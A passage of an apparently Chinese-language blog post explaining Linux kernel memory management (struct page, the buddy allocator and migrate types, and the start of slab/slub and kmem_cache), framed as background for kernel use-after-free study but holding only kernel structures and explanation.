class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Each physical page in the system has a struct page associated with</span></span><br><span class="line"><span class="comment"> * it to keep track of whatever it is we are using the page for at the</span></span><br><span class="line"><span class="comment"> * moment. Note that we have no way to track which tasks are using</span></span><br><span class="line"><span class="comment"> * a page, though if it is a pagecache page, rmap structures can tell us</span></span><br><span class="line"><span class="comment"> * who is mapping it.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The objects in struct page are organized in double word blocks in</span></span><br><span class="line"><span class="comment"> * order to allows us to use atomic double word operations on portions</span></span><br><span class="line"><span class="comment"> * of struct page. That is currently only used by slub but the arrangement</span></span><br><span class="line"><span class="comment"> * allows the use of atomic double word operations on the flags/mapping</span></span><br><span class="line"><span class="comment"> * and lru list pointers also.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">    <span class="comment">/* First double word block */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;        <span class="comment">/* Atomic flags, some possibly updated asynchronously</span></span><br><span class="line"><span class="comment">                                              描述page的状态和其他信息  */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span>  <span class="comment">/* If low bit clear, points to</span></span><br><span class="line"><span class="comment">                         * inode address_space, or NULL.</span></span><br><span class="line"><span class="comment">                         * If page mapped as anonymous</span></span><br><span class="line"><span class="comment">                         * memory, low bit is set, and</span></span><br><span class="line"><span class="comment">                         * it points to anon_vma object:</span></span><br><span class="line"><span class="comment">                         * see PAGE_MAPPING_ANON below.</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line">        <span class="type">void</span> *s_mem;            <span class="comment">/* slab first object 现移动至struct slab结构体*/</span> </span><br><span class="line">        <span class="type">atomic_t</span> compound_mapcount;     <span class="comment">/* first tail page */</span></span><br><span class="line">        <span class="comment">/* page_deferred_list().next     -- second tail page */</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Second double word */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">            <span class="type">pgoff_t</span> index;      <span class="comment">/* Our offset within mapping.</span></span><br><span class="line"><span class="comment">            在映射的虚拟空间（vma_area）内的偏移；</span></span><br><span class="line"><span class="comment">            一个文件可能只映射一部分，假设映射了1M的空间，</span></span><br><span class="line"><span class="comment">            index指的是在1M空间内的偏移，而不是在整个文件内的偏移。 */</span></span><br><span class="line">            <span class="type">void</span> *freelist;     <span class="comment">/* sl[aou]b first free object */</span></span><br><span class="line">            <span class="comment">/* page_deferred_list().prev    -- second tail page */</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_HAVE_CMPXCHG_DOUBLE) &amp;&amp; \</span></span><br><span class="line"><span class="meta">    defined(CONFIG_HAVE_ALIGNED_STRUCT_PAGE)</span></span><br><span class="line">            <span class="comment">/* Used for cmpxchg_double in slub */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> counters;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Keep _refcount separate from slub cmpxchg_double</span></span><br><span class="line"><span class="comment">             * data.  As the rest of the double word is protected by</span></span><br><span class="line"><span class="comment">             * slab_lock but _refcount is not.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="type">unsigned</span> counters;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"></span><br><span class="line">                <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     * Count of ptes mapped in mms, to show</span></span><br><span class="line"><span class="comment">                     * when page is mapped &amp; limit reverse</span></span><br><span class="line"><span class="comment">                     * map searches.</span></span><br><span class="line"><span class="comment">                     * 页映射计数器</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    <span class="type">atomic_t</span> _mapcount;</span><br><span class="line"></span><br><span class="line">                    <span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* SLUB */</span></span><br><span class="line">                        <span class="type">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line">                        <span class="type">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line">                        <span class="type">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">                    &#125;;</span><br><span class="line">                    <span class="type">int</span> units;      <span class="comment">/* SLOB */</span></span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * Usage count, *USE WRAPPER FUNCTION*</span></span><br><span class="line"><span class="comment">                 * when manual accounting. See page_ref.h</span></span><br><span class="line"><span class="comment">                 * 页引用计数器</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="type">atomic_t</span> _refcount;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> active;    <span class="comment">/* SLAB */</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Third double word block</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * WARNING: bit 0 of the first word encode PageTail(). That means</span></span><br><span class="line"><span class="comment">     * the rest users of the storage space MUST NOT use the bit to</span></span><br><span class="line"><span class="comment">     * avoid collision and false-positive PageTail().</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span>   <span class="comment">/* Pageout list, eg. active_list</span></span><br><span class="line"><span class="comment">                     * protected by zone-&gt;lru_lock !</span></span><br><span class="line"><span class="comment">                     * Can be used as a generic list</span></span><br><span class="line"><span class="comment">                     * by the page owner.</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">dev_pagemap</span> *<span class="title">pgmap</span>;</span> <span class="comment">/* ZONE_DEVICE pages are never on an</span></span><br><span class="line"><span class="comment">                        * lru or handled by a slab</span></span><br><span class="line"><span class="comment">                        * allocator, this points to the</span></span><br><span class="line"><span class="comment">                        * hosting device page map.</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>        <span class="comment">/* slub per cpu partial pages */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">next</span>;</span>      <span class="comment">/* Next partial slab */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line">            <span class="type">int</span> pages;      <span class="comment">/* Nr of partial slabs left */</span></span><br><span class="line">            <span class="type">int</span> pobjects;   <span class="comment">/* Approximate # of objects */</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            <span class="type">short</span> <span class="type">int</span> pages;</span><br><span class="line">            <span class="type">short</span> <span class="type">int</span> pobjects;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span>       <span class="comment">/* Used by SLAB</span></span><br><span class="line"><span class="comment">                         * when destroying via RCU</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line">        <span class="comment">/* Tail pages of compound page */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> compound_head; <span class="comment">/* If bit zero is set */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* First tail page only */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * On 64 bit system we have enough space in struct page</span></span><br><span class="line"><span class="comment">             * to encode compound_dtor and compound_order with</span></span><br><span class="line"><span class="comment">             * unsigned int. It can help compiler generate better or</span></span><br><span class="line"><span class="comment">             * smaller code on some archtectures.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> compound_dtor;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> compound_order;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> compound_dtor;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> compound_order;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_TRANSPARENT_HUGEPAGE) &amp;&amp; USE_SPLIT_PMD_PTLOCKS</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> __pad;    <span class="comment">/* do not overlay pmd_huge_pte</span></span><br><span class="line"><span class="comment">                         * with compound_head to avoid</span></span><br><span class="line"><span class="comment">                         * possible bit 0 collision.</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line">            <span class="type">pgtable_t</span> pmd_huge_pte; <span class="comment">/* protected by page-&gt;ptl */</span></span><br><span class="line">        &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Remainder is not double word aligned */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> private;      <span class="comment">/* Mapping-private opaque data:</span></span><br><span class="line"><span class="comment">                         * usually used for buffer_heads</span></span><br><span class="line"><span class="comment">                         * if PagePrivate set; used for</span></span><br><span class="line"><span class="comment">                         * swp_entry_t if PageSwapCache;</span></span><br><span class="line"><span class="comment">                         * indicates order in the buddy</span></span><br><span class="line"><span class="comment">                         * system if PG_buddy is set.</span></span><br><span class="line"><span class="comment">                         * 私有数据指针，由应用场景确定其具体的含义</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_SPLIT_PTE_PTLOCKS</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ALLOC_SPLIT_PTLOCKS</span></span><br><span class="line">        <span class="type">spinlock_t</span> *ptl;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        <span class="type">spinlock_t</span> ptl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span>  <span class="comment">/* SL[AU]B: Pointer to slab */</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">mem_cgroup</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * On machines where all RAM is mapped into kernel address space,</span></span><br><span class="line"><span class="comment">     * we can simply calculate the virtual address. On machines with</span></span><br><span class="line"><span class="comment">     * highmem some memory is mapped into kernel virtual memory</span></span><br><span class="line"><span class="comment">     * dynamically, so we need a place to store that address.</span></span><br><span class="line"><span class="comment">     * Note that this field could be 16 bits on x86 ... ;)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Architectures with slow multiplication can define</span></span><br><span class="line"><span class="comment">     * WANT_PAGE_VIRTUAL in asm/page.h</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(WANT_PAGE_VIRTUAL)</span></span><br><span class="line">    <span class="type">void</span> *virtual;          <span class="comment">/* Kernel virtual address (NULL if</span></span><br><span class="line"><span class="comment">                       not kmapped, ie. highmem) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* WANT_PAGE_VIRTUAL */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KMEMCHECK</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * kmemcheck wants to track the status of each byte in a page; this</span></span><br><span class="line"><span class="comment">     * is a pointer to such a status block. NULL if not tracked.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">void</span> *shadow;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> LAST_CPUPID_NOT_IN_PAGE_FLAGS</span></span><br><span class="line">    <span class="type">int</span> _last_cpupid;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The struct page can be forced to be double word aligned so that atomic ops</span></span><br><span class="line"><span class="comment"> * on double words work. The SLUB allocator can make use of such a feature.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_HAVE_ALIGNED_STRUCT_PAGE</span></span><br><span class="line">    __aligned(<span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>在较低版本的内核中，slab没有单独的结构体，全部都是集成到page中的。后续由于空间和可读性的原因将slab单独抽了出来。page结构内部还是有相当多的slab有关字段，以及标识页面所属和属性的标志位。</p><h1>Buddy System——伙伴系统</h1><blockquote><p>attrnba3大佬的博客 <a href="https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I/#%E4%B8%89%E3%80%81buddy-system">https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I/#三、buddy-system</a></p></blockquote><p>Buddy System是linux内核以内存页为粒度的一种底层管理机制。在一个zone中会有一个free_area数组用来存储页面，一般大小为11。这个数组就是给buddy system管理用的。</p><p>buddy system本质上也是为了解决频繁内存分配的问题而生的。因为其实理论上我们有page后就可以进行分配了，但是这会面临相当多的问题，最重要的一个问题之一就是碎片。碎片分为内部碎片和外部碎片，外部碎片指的是页碎片，分配3个，释放第一个，这样再次分配大于1的页面第一页就永远不会被用到。内部碎片则是指页内碎片，比如我只需要很少的字节却分配4k的页面导致大量内存闲置。而buddy system就是为了解决外部碎片而生的。下面所说的slab/slob则是为了解决内部碎片而生的。</p><p>buddy system给出了一种很聪明的管理方案，它将物理内存页按照不同的数量（2的幂次）划分连续的块进行分配并用一个数组进行管理。比如free_area[0]就是单个page连接的链表，而free_area[1]则是每个元素由两个物理连续的page构成的链表，依此类推。</p><p><img src="/images/linux_mem/buddy_system.png" alt="buddy_system.png"></p><p>同时，buddy system将页标识为了不同的属性：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">migratetype</span> &#123;</span></span><br><span class="line">MIGRATE_UNMOVABLE,</span><br><span class="line">MIGRATE_MOVABLE,</span><br><span class="line">MIGRATE_RECLAIMABLE,</span><br><span class="line">MIGRATE_PCPTYPES,<span class="comment">/* the number of types on the pcp lists */</span></span><br><span class="line">MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CMA</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * MIGRATE_CMA migration type is designed to mimic the way</span></span><br><span class="line"><span class="comment"> * ZONE_MOVABLE works.  Only movable pages can be allocated</span></span><br><span class="line"><span class="comment"> * from MIGRATE_CMA pageblocks and page allocator never</span></span><br><span class="line"><span class="comment"> * implicitly change migration type of MIGRATE_CMA pageblock.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The way to use it is to change migratetype of a range of</span></span><br><span class="line"><span class="comment"> * pageblocks to MIGRATE_CMA which can be done by</span></span><br><span class="line"><span class="comment"> * __free_pageblock_cma() function.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">MIGRATE_CMA,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line">MIGRATE_ISOLATE,<span class="comment">/* can&#x27;t allocate from here */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">MIGRATE_TYPES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这些属性如下：</p><blockquote><ul class="lvl-1"><li class="lvl-2"><p>不可移动页：在内存中有固定位置，不能移动到其他地方。内核中使用的页大部分是属于这种类型。</p></li><li class="lvl-2"><p>可回收页：不能直接移动，但可以删除，页中的内容可以从某些源中重新生成。例如，页内容是映射到文件数据的页就属于这种类型。对于这种类型，在内存短缺(分配失败)时，会发起内存回收，将这类型页进行回写释放。</p></li><li class="lvl-2"><p>可移动页：可随意移动，用户空间的进程使用的没有映射具体磁盘文件的页就属于这种类型(比如堆、栈、shmem共享内存、匿名mmap共享内存)，它们是通过进程页表映射的，把这些页复制到新位置时，只要更新进程页表就可以了。一般这些页是从高端内存管理区获取。</p></li></ul></blockquote><p>buddy system每个free_area元素都有一个<code>free_list[4]</code>链表指针数组，对应了四种不同的页属性。每个链上的属性都一致，每个free_area的连续页数量也都一致。</p><h2 id="分配和释放逻辑">分配和释放逻辑</h2><p>在请求空间的时候，buddy system首先会将需求向2的幂次对齐，然后去对应的下标取出连续空间。</p><ul class="lvl-0"><li class="lvl-2"><p>匹配属性和大小，找到对应的free_list链表往下摘</p></li><li class="lvl-2"><p>如果对应的链表为空，就向下一个free_area去请求，请求到后一分为二，返回一个，将另一个放进上面的链表。再空就继续向上找。</p></li><li class="lvl-2"><p>释放后连续的就放到对应链表上（bin），空闲的就合并往更高层放。</p></li></ul><p>而外部碎片的问题只是被很大程度的减弱了，而并没有被完全解决，内核还会执行页面迁移来减少碎片，不再赘述。这个页面迁移的内核接口是很多别的功能的基础</p><blockquote><p><a href="https://blog.csdn.net/yhb1047818384/article/details/119920971">https://blog.csdn.net/yhb1047818384/article/details/119920971</a><br>可以发现， 页面迁移不是简单的把一个page从A位置移动到B位置，它的本质是一个分配新页面，将旧页面的内容拷贝至新页面，解除旧页面的映射关系，并将映射关系映射到新页面，最后释放旧页面的过程。</p></blockquote><h1>Slab/Slub</h1><p><strong>这是我们利用内核UAF要主要掌握的内容</strong></p><p>slab是运行于buddy system之上的一个更小粒度的内存分配系统。用于解决内部碎片的问题。像file和task_struct等等这些频繁使用的小结构体， 伙伴系统只能每次申请至少一个page,显然没法满足我们这种需求，slab就出现了。</p><p>slab是最早的版本，而这个版本太古早以至于有很多问题，一个很重要的问题就是NUMA架构的支持不好（尽管我们现在都用的是这个架构），非常臃肿。因此被大神们优化成了现在用的slub系统。保留了基本的思想框架，对很多细节和实现做了优化，包括放弃了着色系统，多处理器和NUMA优化等等。但是linux内核中相关的接口都以slab命名，开发者们也都保留了这些名称，因此下面的slab和slub很可能会混用，读者可以自行分辨。</p><p>另外，slob则是更针对嵌入式系统的一个内存分配系统</p><blockquote><p>参考：（强烈推荐）：<a href="https://segmentfault.com/a/1190000043626203#item-4">https://segmentfault.com/a/1190000043626203#item-4</a><br><a href="https://blog.csdn.net/qq_54218833/article/details/127218102">https://blog.csdn.net/qq_54218833/article/details/127218102</a></p></blockquote><h2 id="概述">概述</h2><p>首先，我们来看slab的一个简单的概述。slab从buddy申请来连续的内存页后，按照对象的大小将其池化成很多小的/内存对齐的对象。它们用kmem_cache管理，链接在链表上，然后充分利用cpu缓存和程序局部性来进行高速的分配和释放</p><blockquote><p>上面这段其实是写完之后回头再写的</p></blockquote><p>slab的管理层级大概是kmem_cache(slab_cache)-&gt;slab(freelist/pageframes)-&gt;object的逻辑，要具体掌握slab机制比较麻烦，下面按照拆解组成，分配，释放三个部分, 以自顶向下的逻辑大概介绍下slab。（其实自底向上会更好理解一些具体的实现）</p><h2 id="拆解组件">拆解组件</h2><h3 id="kmem-cache">kmem_cache</h3><p>在slab中，它所管理的内存分配单元称为“对象”(Object)。而这些slab则是被slab cache所管理的slab池（层层池化？），用一个<code>kmem_cache</code>结构体管理。<br>kmem_cache是一个分配器，可以理解成类似main_arena的东西。而从buddy system每次取来的一个或几个连续的页框被称为一个<code>slab</code>，slab分配器将每个slab拆分成若干对象向下一级进行分配。一个kmem_cache对应某一种功能/大小的对象分配，所有的kmem_cache被存放在一个数组中管理。</p><p>slub kmem_cache结构（<strong>缝合了源码和大佬的部分注释版本，不代表结构体定义，仅供理解</strong>）:</p><blockquote><p>随手写一下，染色系统是为了解决多CPU cache缓存不同大小但slab内相同偏移对象时会处于同一行的问题所创立的，但是可能没什么太大用被slub删掉了</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_SLUB_TINY</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span> <span class="comment">// 关键字段</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">// slab cache 的管理标志位，用于设置 slab 的一些特性</span></span><br><span class="line">    <span class="comment">// 比如：slab 中的对象按照什么方式对齐，对象是否需要 POISON  毒化，是否插入 red zone 在对象内存周围，是否追踪对象的分配和释放信息 等等</span></span><br><span class="line">    <span class="type">slab_flags_t</span> flags;</span><br><span class="line">    <span class="comment">// slab 对象在内存中的真实占用，包括为了内存对齐填充的字节数，red zone 等等</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> size;  <span class="comment">/* The size of an object including metadata */</span></span><br><span class="line">    <span class="comment">// slab 中对象的实际大小，不包含填充的字节数</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> object_size;<span class="comment">/* The size of an object without metadata */</span></span><br><span class="line">    <span class="comment">// slab 对象池中的对象在没有被分配之前，我们是不关心对象里边存储的内容的。</span></span><br><span class="line">    <span class="comment">// 内核巧妙的利用对象占用的内存空间存储下一个空闲对象的地址。</span></span><br><span class="line">    <span class="comment">// offset 表示用于存储下一个空闲对象指针的位置距离对象首地址的偏移</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset;    <span class="comment">/* Free pointer offset */</span></span><br><span class="line">    <span class="comment">// 表示 cache 中的 slab 大小，包括 slab 所需要申请的页面个数，以及所包含的对象个数</span></span><br><span class="line">    <span class="comment">// 其中低 16 位表示一个 slab 中所包含的对象总数，高 16 位表示一个 slab 所占有的内存页个数。</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line">    <span class="comment">// slab 中所能包含对象以及内存页个数的最大值</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">max</span>;</span></span><br><span class="line">    <span class="comment">// 当按照 oo 的尺寸为 slab 申请内存时，如果内存紧张，会采用 min 的尺寸为 slab 申请内存，可以容纳一个对象即可。</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line">    <span class="comment">// 向伙伴系统申请内存时使用的内存分配标识</span></span><br><span class="line">    <span class="type">gfp_t</span> allocflags; </span><br><span class="line">    <span class="comment">// slab cache 的引用计数，为 0 时就可以销毁并释放内存回伙伴系统重</span></span><br><span class="line">    <span class="type">int</span> refcount;   </span><br><span class="line">    <span class="comment">// 池化对象的构造函数，用于创建 slab 对象池中的对象</span></span><br><span class="line">    <span class="type">void</span> (*ctor)(<span class="type">void</span> *);</span><br><span class="line">    <span class="comment">// 对象的 object_size 按照 word 字长对齐之后的大小</span></span><br><span class="line">    <span class="type">unsigned</span> <span 